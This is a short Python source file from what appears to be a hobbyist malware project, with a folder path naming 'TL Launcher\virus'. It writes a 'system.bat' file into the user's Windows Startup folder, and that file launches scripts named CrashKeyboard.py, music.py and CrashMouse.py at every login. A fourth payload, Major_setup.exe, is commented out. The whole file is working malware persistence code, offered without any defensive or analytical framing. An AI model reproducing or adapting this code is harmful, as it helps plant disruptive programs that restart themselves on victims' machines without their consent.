import os
import subprocess
import ctypes
import sys


class Setrun:
    def setbat():
        user = os.getenv("USERPROFILE")
        autorun = user + '/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'.replace('/','\\')

        program1 = user + r'\Desktop\TL Launcher\virus\.py\modules\headset\keyboard\CrashKeyboard.py'
        program2 = user + r'\Desktop\TL Launcher\virus\.py\modules\Sound\music.py'
        program3 = user + r'\Desktop\TL Launcher\virus\.py\modules\headset\mouse\CrashMouse.py'
        #program4 = user + r'\Desktop\TL Launcher\virus\.exe\Major_setup.exe'

        with open(autorun + '/system.bat', mode='w+') as bat:
            bat.write('@echo off' + "\n")
            bat.write('start %windir%\explorer.exe ' + f"{program1}" + "\n")
            bat.write('start %windir%\explorer.exe ' + f"{program2}" + "\n")
            bat.write('start %windir%\explorer.exe ' + f"{program3}" + "\n")
            #bat.write('start %windir%\explorer.exe' + program4 + "\n")

